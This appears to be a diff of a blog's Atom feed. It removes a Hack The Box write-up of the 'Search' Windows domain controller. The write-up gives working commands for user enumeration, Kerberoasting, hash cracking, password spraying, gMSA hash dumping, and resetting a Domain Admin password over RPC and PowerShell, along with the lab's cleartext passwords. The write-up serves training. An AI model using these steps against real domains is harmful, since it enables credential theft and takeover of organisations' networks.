 <p><img src="/assets/TartarSauce/shell-as-onuma.jpg" alt="" /></p>
 
-<h2 id="detecting-system-operations">Detecting system operations</h2>
+<h2 id="detecting-system-operations">Detecting System Operations</h2>
 <p><em>When running a quick</em> <a href="https://github.com/carlospolop/PEASS-ng">linpeas.sh</a>, we spot a <strong>unique system timer:</strong></p>
 
 <p><img src="/assets/TartarSauce/system-timers.jpg" alt="" /></p>
@@ -3342,313 +3805,4 @@ psexec.py <span class="nt">-k</span> <span class="nt">-no-pass</span> intelligen
 
 <p><img src="/assets/Intelligence/box-owned.jpg" alt="box-owned" /></p>
 
-<p>Pretty sweet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Search</title><link href="http://localhost:4000/2022/06/28/Search.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Search" /><published>2022-06-28T00:00:00+02:00</published><updated>2022-06-28T00:00:00+02:00</updated><id>http://localhost:4000/2022/06/28/Search</id><content type="html" xml:base="http://localhost:4000/2022/06/28/Search.html"><![CDATA[<p><img src="/assets/Search/Search.png" alt="Search" /></p>
-
-<h2 id="summary">Summary</h2>
-<ul>
-  <li>A <strong>Windows Domain Controller</strong> machine where we don’t get any access using conventional methods. The key to gaining our initial set of credentials is by inspecting <em>the images</em> on the website where one turns out to have <strong>credentials</strong> for a user called <code class="language-plaintext highlighter-rouge">hope.sharp</code></li>
-  <li><em>Using this authenticated access,</em> we run a <strong>Kerberoast</strong> attack which gets us the hash of the <code class="language-plaintext highlighter-rouge">web_svc</code> account that we crack to get a password.</li>
-  <li><em>When spraying this password across the domain users,</em> we find out that the password is also used by another user: <code class="language-plaintext highlighter-rouge">edgar.jacobs</code>.</li>
-  <li>Edgar’s shared redirected folder was exposing his user profile which contained an interesting <strong>Microsoft Excel</strong> document called <code class="language-plaintext highlighter-rouge">Phishing_Attempt.xlsx</code>.</li>
-  <li><em>When closely checking the contents of that document,</em> we find a <em>hidden</em> column which cannot be viewed because of the protection on the document.</li>
-  <li>Uploading the Excel workbook to <strong>Google Sheets</strong> does the trick and shows us the hidden column which turned out to be a set of passwords.</li>
-  <li>One of the passwords worked for a user called <code class="language-plaintext highlighter-rouge">sierra.frye</code> which had the permission to read the <strong>GMSA</strong> password of <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code>.</li>
-  <li>The account <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> had a <code class="language-plaintext highlighter-rouge">WriteDACL</code> right on a <strong>Domain Administrator</strong> called <code class="language-plaintext highlighter-rouge">tristan.davies</code>.</li>
-  <li>We use a python script to retrieve the <strong>NTLM</strong> hash of <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> and abuse his rights to reset the password of <code class="language-plaintext highlighter-rouge">tristan.davies</code> via <strong>RPC.</strong></li>
-  <li>Another route that is a bit longer includes using the <strong>PowerShell Web Access</strong> enabled on the web server after cracking then importing into our browser a <code class="language-plaintext highlighter-rouge">.pfx</code> certificate found on the shared user profile of the <code class="language-plaintext highlighter-rouge">sierra.frye</code> user.</li>
-</ul>
-
-<hr />
-
-<h2 id="nmap">Nmap</h2>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-80/tcp    open  http          Microsoft IIS httpd 10.0
-|_http-server-header: Microsoft-IIS/10.0
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-title: Search &amp;mdash; Just Testing IIS
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-25 20:46:51Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=research
-| Not valid before: 2020-08-11T08:13:35
-|_Not valid after:  2030-08-09T08:13:35
-|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
-443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
-|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
-|_http-title: Search &amp;mdash; Just Testing IIS
-|_http-server-header: Microsoft-IIS/10.0
-| http-methods: 
-|_  Potentially risky methods: TRACE
-| tls-alpn: 
-|_  http/1.1
-| ssl-cert: Subject: commonName=research
-| Not valid before: 2020-08-11T08:13:35
-|_Not valid after:  2030-08-09T08:13:35
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=research
-| Not valid before: 2020-08-11T08:13:35
-|_Not valid after:  2030-08-09T08:13:35
-|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=research
-| Not valid before: 2020-08-11T08:13:35
-|_Not valid after:  2030-08-09T08:13:35
-|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
-3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=research
-| Not valid before: 2020-08-11T08:13:35
-|_Not valid after:  2030-08-09T08:13:35
-|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
-8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
-|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: Site doesn't have a title.
-| tls-alpn: 
-|_  http/1.1
-| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
-| Not valid before: 2020-04-07T09:05:25
-|_Not valid after:  2030-04-05T09:05:25
-9389/tcp  open  mc-nmf        .NET Message Framing
-49667/tcp open  msrpc         Microsoft Windows RPC
-49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49676/tcp open  msrpc         Microsoft Windows RPC
-49702/tcp open  msrpc         Microsoft Windows RPC
-49716/tcp open  msrpc         Microsoft Windows RPC
-49736/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled and required
-| smb2-time: 
-|   date: 2022-06-25T20:47:44
-|_  start_date: N/A
-</code></pre></div></div>
-
-<p>We see standard Domain Controller ports (53, 88, 389 &amp; 3269) and <strong>IIS</strong> on ports 80, 443 &amp; 8172</p>
-
-<p>Port 5985 wasn’t open so that meant no <strong>WinRM</strong> for this box</p>
-
-<h2 id="stuff-we-tried-but-didnt-work">Stuff we tried but didn’t work</h2>
-<ol>
-  <li><strong>SMB</strong> enumeration using anonymous, guest and null sessions.</li>
-  <li><strong>RPC</strong> enumeration with <code class="language-plaintext highlighter-rouge">enum4linux-ng</code>.</li>
-  <li><strong>LDAP</strong> enumeration with <code class="language-plaintext highlighter-rouge">ldapsearch</code> using anonymous authentication.</li>
-  <li>Collecting usernames from the website and trying them. We got 3 valid users. But none of them was <strong>ASREPRoastable</strong> or had a weak password.</li>
-  <li>Web Directory Bruteforcing. The only unique directory was <code class="language-plaintext highlighter-rouge">/staff</code> but we got access denied. We also did file bruteforcing with multiple extensions without much success.</li>
-  <li>Viewing the source code for the accessible web pages.</li>
-  <li>Checking for <strong>Virtual Host Routing</strong>.</li>
-</ol>
-
-<p>All of those didn’t yield any results. However..</p>
-
-<h2 id="when-you-use-a-magnifying-glass">When you use a magnifying glass..</h2>
-<p><em>when looking really close at one of the images on the website,</em> something is there!</p>
-
-<p><img src="/assets/Search/secret-image-small.jpg" alt="secret-image-small" /></p>
-
-<p>The text was very small. so we had to open up the image in a new tab and zoom in to find what’s written:</p>
-
-<p><img src="/assets/Search/secret-image-up-close.jpg" alt="secret-image-up-close" /></p>
-
-<p>It said: <strong>“Send password to Hope Sharp”</strong> then <strong>“IsolationIsKey?”</strong></p>
-
-<h2 id="first-set-of-credentials">First set of credentials</h2>
-<p><em>Earlier,</em> when extracted usernames from the website:</p>
-
-<p><img src="/assets/Search/website-users-2.jpg" alt="website-users" /></p>
-
-<p>we used a python tool called <a href="/assets/Search/https://github.com/w0Tx/generate-ad-username"><code class="language-plaintext highlighter-rouge">ADGenerator</code></a> to generate a list of usernames based on their first and last names following common naming conventions:</p>
-
-<ul>
-  <li>NameSurname</li>
-  <li>Name.Surname</li>
-  <li>NamSur (3letters of each)</li>
-  <li>Nam.Sur</li>
-  <li>NSurname</li>
-  <li>N.Surname</li>
-  <li>SurnameName</li>
-  <li>Surname.Name</li>
-  <li>SurnameN</li>
-  <li>Surname.N</li>
-</ul>
-
-<p>and we used a tool called <a href="/assets/Search/https://github.com/ropnop/kerbrute"><code class="language-plaintext highlighter-rouge">kerbrute</code></a> to enumerate which were valid users using the <code class="language-plaintext highlighter-rouge">userenum</code> module.</p>
-
-<p><img src="/assets/Search/kerbrute-userenum.jpg" alt="kerbrute-userenum" /></p>
-
-<p><em>From that,</em> we know that the username convention is <strong>Name.Surname</strong></p>
-
-<p>We went ahead and found the password <strong>“IsolationIsKey?”</strong> to work with <strong>“Hope.Sharp”</strong></p>
-
-<p><img src="/assets/Search/auth-as-hope-sharp.jpg" alt="auth-as-hope-sharp" /></p>
-
-<h2 id="the-awesomeness-of-bloodhound">The Awesomeness of BloodHound</h2>
-<p><em>Since port 5985 isn’t open,</em> we have no reason to check for <strong>WinRM</strong> capabilities. So we turn to using all the tools that don’t require a foothold on the box.</p>
-
-<p>We start with <a href="/assets/Search/https://github.com/fox-it/BloodHound.py"><code class="language-plaintext highlighter-rouge">BloodHound.py</code></a> to get an overview of the situation in the domain.</p>
-
-<p><strong>Note:</strong> it’s recommended to set your <strong>DNS</strong> server in <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code> to the box’s IP to make sure things go smoothly when using any of the tools we’re about to use.</p>
-
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 bloodhound.py <span class="nt">-d</span> search.htb <span class="nt">-dc</span> research.search.htb <span class="nt">-u</span> hope.sharp <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span>
-</code></pre></div></div>
-
-<p><img src="/assets/Search/bloodhound-py.jpg" alt="bloodhound-py" /></p>
-
-<p><em>When checking the output of the</em> <code class="language-plaintext highlighter-rouge">ShortestPath to High Value Targets</code>, we see a <strong>clear path</strong> to owning the domain:</p>
-
-<p><img src="/assets/Search/clear-path-to-DA.jpg" alt="clear-path-to-DA" /></p>
-
-<p>We would first have to make our way to any of users on the left within the <code class="language-plaintext highlighter-rouge">ITSEC</code> group.</p>
-
-<p><em>In another</em> <code class="language-plaintext highlighter-rouge">BloodHound</code> <em>query for kerberoastable accounts</em>, we find we can attack <code class="language-plaintext highlighter-rouge">WEB_SVC</code>:</p>
-
-<p><img src="/assets/Search/web-svc-kerberoastable.jpg" alt="web-svc-kerberoastable" /></p>
-
-<h2 id="kerberoasting-web_svc">Kerberoasting <code class="language-plaintext highlighter-rouge">web_svc</code></h2>
-<p>we use impacket’s <code class="language-plaintext highlighter-rouge">GetUserSPNs.py</code></p>
-
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 GetUserSPNs.py <span class="nt">-debug</span> <span class="nt">-request</span> <span class="nt">-dc-ip</span> 10.10.11.129 search.htb/hope.sharp:<span class="s1">'IsolationIsKey?'</span>
-</code></pre></div></div>
-
-<p><img src="/assets/Search/kerberoasted.jpg" alt="kerberoasted" /></p>
-
-<p>And we crack the password using <code class="language-plaintext highlighter-rouge">john</code></p>
-
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john web_svc_hash <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
-</code></pre></div></div>
-
-<p><img src="/assets/Search/cracked-with-john.jpg" alt="cracked-with-john" /></p>
-
-<p>The password was <strong>“@3ONEmillionbaby”</strong></p>
-
-<h2 id="checking-for-password-reuse">Checking for Password Reuse</h2>
-<p>It has turned into a habit for me to spray any password I get on all possible users xD</p>
-
-<p><em>In order to get a the full list of domain users,</em> I use <code class="language-plaintext highlighter-rouge">crackmapexec</code> with the <code class="language-plaintext highlighter-rouge">--users</code> flag.</p>
-
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.129 <span class="nt">-u</span> <span class="s1">'web_svc'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--users</span>
-</code></pre></div></div>
-
-<p><img src="/assets/Search/cme-full-userlist.jpg" alt="cme-full-userlist" /></p>
-
-<p>We find out that another user had been user the same password <strong>“@3ONEmillionbaby”</strong></p>
-
-<p><img src="/assets/Search/edgar-reusing.jpg" alt="edgar-reusing" /></p>
-
-<h2 id="enumerating-smb-access-for-edgar">Enumerating SMB access for Edgar</h2>
-<p>We use <code class="language-plaintext highlighter-rouge">crackmapexec</code>’s <code class="language-plaintext highlighter-rouge">spider_plus</code> module to get a <em>nicely-formatted</em> <strong>JSON</strong> output for <code class="language-plaintext highlighter-rouge">edgar</code>’s share access.</p>
-
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.129 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">-M</span> spider_plus
-</code></pre></div></div>
-
-<p>We notice something interesting in the results:</p>
-
-<p><img src="/assets/Search/interesting-document-found.jpg" alt="interesting-document-found" /></p>
-
-<p>we use <code class="language-plaintext highlighter-rouge">smbclient</code> to fetch the file:</p>
-
-<p><img src="/assets/Search/getting-the-sheet.jpg" alt="getting-the-sheet" /></p>
-
-<p><em>After opening the document with</em> <strong>Microsoft Office’s Excel</strong> <em>and looking into the second tab of the workbook,</em> we notice a hidden column: <strong>C</strong></p>
-
-<p><img src="/assets/Search/hidden-column.jpg" alt="hidden-column" /></p>
-
-<p>We won’t be able to <strong>unhide</strong> this column unless we <strong>unprotect</strong> the sheet:</p>
-
-<p><img src="/assets/Search/unprotecting-sheet.jpg" alt="unprotecting-sheet" /></p>
-
-<p><em>We can, however,</em> use the trick of uploading the <code class="language-plaintext highlighter-rouge">xlsx</code> file to <strong>Google Sheets</strong> :D</p>
-
-<p><img src="/assets/Search/got-them-passwords.jpg" alt="got-them-passwords" /></p>
-
-<p><strong>PROFIT! :D</strong></p>
-
-<h2 id="access-as-sierra">Access as Sierra</h2>
-<p><em>When using the obtained passwords throughout the domain,</em> we gain access to <code class="language-plaintext highlighter-rouge">seirra.frye</code></p>
-
-<p><img src="/assets/Search/got-sierra.jpg" alt="got-sierra" /></p>
-
-<p>and since <code class="language-plaintext highlighter-rouge">sierra</code> is a member of the <code class="language-plaintext highlighter-rouge">ITSEC</code> group, we’re going to go for a full domain takeover!</p>
-
-<p><img src="/assets/Search/path-to-da.jpg" alt="path-to-da" /></p>
-
-<h2 id="reading-the-gmsa-password--resetting-tristans-password">Reading the GMSA password &amp; Resetting <code class="language-plaintext highlighter-rouge">tristan</code>’s password</h2>
-<p>We can obtain the <strong>NTLM</strong> hash of the <strong>GMSA</strong> <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> with a <strong>python</strong> tool called <a href="/assets/Search/https://github.com/micahvandeusen/gMSADumper"><code class="language-plaintext highlighter-rouge">gMSADumper</code></a></p>
-
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 gMSADumper.py <span class="nt">-u</span> Sierra.Frye <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">-d</span> search.htb
-</code></pre></div></div>
-
-<p><img src="/assets/Search/got-gmsa-ntlm.jpg" alt="got-gmsa-ntlm" /></p>
-
-<p>What’s left is to reset the password for <code class="language-plaintext highlighter-rouge">tristan</code> which we can do through <code class="language-plaintext highlighter-rouge">rpcclient</code> using the <code class="language-plaintext highlighter-rouge">--pw-nt-hash</code> to pass the hash.</p>
-
-<p>then following with the <code class="language-plaintext highlighter-rouge">setuserinfo2</code> command making sure our password satisfies the complexity requirements.</p>
-
-<p>and finishing with <strong>impacket</strong>’s <code class="language-plaintext highlighter-rouge">wmiexec.py</code> to get full shell access.</p>
-
-<p><img src="/assets/Search/got-tristan.jpg" alt="got-tristan" /></p>
-
-<h2 id="an-alternate-route-cracking-the-pfx-certificate-on-sierras-share--using-it-for-powershell-web-access">An Alternate Route: cracking the <code class="language-plaintext highlighter-rouge">.pfx</code> certificate on <code class="language-plaintext highlighter-rouge">sierra</code>’s share + using it for PowerShell web access</h2>
-<p><em>If we take some time to check</em> <code class="language-plaintext highlighter-rouge">sierra</code>’s <em>profile,</em> we see a file called <code class="language-plaintext highlighter-rouge">staff.pfx</code> in the <code class="language-plaintext highlighter-rouge">\Downloads\Backups</code> folder:</p>
-
-<p><img src="/assets/Search/pfx-found.jpg" alt="pfx-found" /></p>
-
-<p>Using <code class="language-plaintext highlighter-rouge">john</code>’s python utility script <code class="language-plaintext highlighter-rouge">pfx2john</code>, we can get a format that’s crackable.</p>
-
-<p><img src="/assets/Search/cracked-pfx.jpg" alt="cracked-pfx" /></p>
-
-<p>We can import these certificates into <code class="language-plaintext highlighter-rouge">firefox</code></p>
-
-<p><img src="/assets/Search/firefox-cert-import.jpg" alt="firefox-cert-import" /></p>
-
-<p><em>After importing the certificates,</em> we can browse to <code class="language-plaintext highlighter-rouge">https://10.10.11.129/staff</code></p>
-
-<p><img src="/assets/Search/powershell-web-access.jpg" alt="powershell-web-access" /></p>
-
-<p>we get a nice web terminal after authenticating:</p>
-
-<p><img src="/assets/Search/powershell-web-terminal.jpg" alt="powershell-web-terminal" /></p>
-
-<p><em>In order to be able to run code as</em> <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA</code>, we’re going to do a couple of things:</p>
-
-<ol>
-  <li>Obtain the <strong>GMSA</strong> password as a secure string. This can be done with the below command:
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$secstringpassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertFrom-ADManagedPasswordBlob</span><span class="w"> </span><span class="p">(</span><span class="n">get-adserviceaccount</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">msDS-ManagedPassword</span><span class="p">)</span><span class="o">.</span><span class="s1">'msDS-ManagedPassword'</span><span class="p">)</span><span class="o">.</span><span class="nf">SecureCurrentPassword</span><span class="w">
-</span></code></pre></div>    </div>
-  </li>
-  <li>Create a <code class="language-plaintext highlighter-rouge">PSCredential</code> object with both the <strong>GMSA</strong> username and the secure string.
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nx">BIR-ADFS-GMSA</span><span class="p">,</span><span class="w"> </span><span class="nv">$secstringpassword</span><span class="w">
-</span></code></pre></div>    </div>
-  </li>
-  <li>Execute a password reset command using the created <code class="language-plaintext highlighter-rouge">PSCredential</code>:
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$Script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">Set-ADAccountPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">tristan.davies</span><span class="w"> </span><span class="nt">-reset</span><span class="w"> </span><span class="nt">-NewPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="s1">'H@CKEDAGA1N!!'</span><span class="w"> </span><span class="nt">-force</span><span class="p">)}</span><span class="w">
-</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="nv">$Script</span><span class="w">
-</span></code></pre></div>    </div>
-  </li>
-  <li>Create another <code class="language-plaintext highlighter-rouge">PSCredential</code> object but with <code class="language-plaintext highlighter-rouge">tristan</code>’s new password:
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$killercreds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nx">Tristan.Davies</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="s1">'H@CKEDAGA1N!!'</span><span class="w"> </span><span class="nt">-force</span><span class="p">)</span><span class="w">
-</span></code></pre></div>    </div>
-  </li>
-  <li>Execute commands as <code class="language-plaintext highlighter-rouge">tristan</code> using the new credential object:
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$killercreds</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="p">}</span><span class="w">
-</span></code></pre></div>    </div>
-  </li>
-</ol>
-
-<p><img src="/assets/Search/tristan-web-access.jpg" alt="tristan-web-access" /></p>
-
-<p>And this wraps up the path :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p>Pretty sweet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
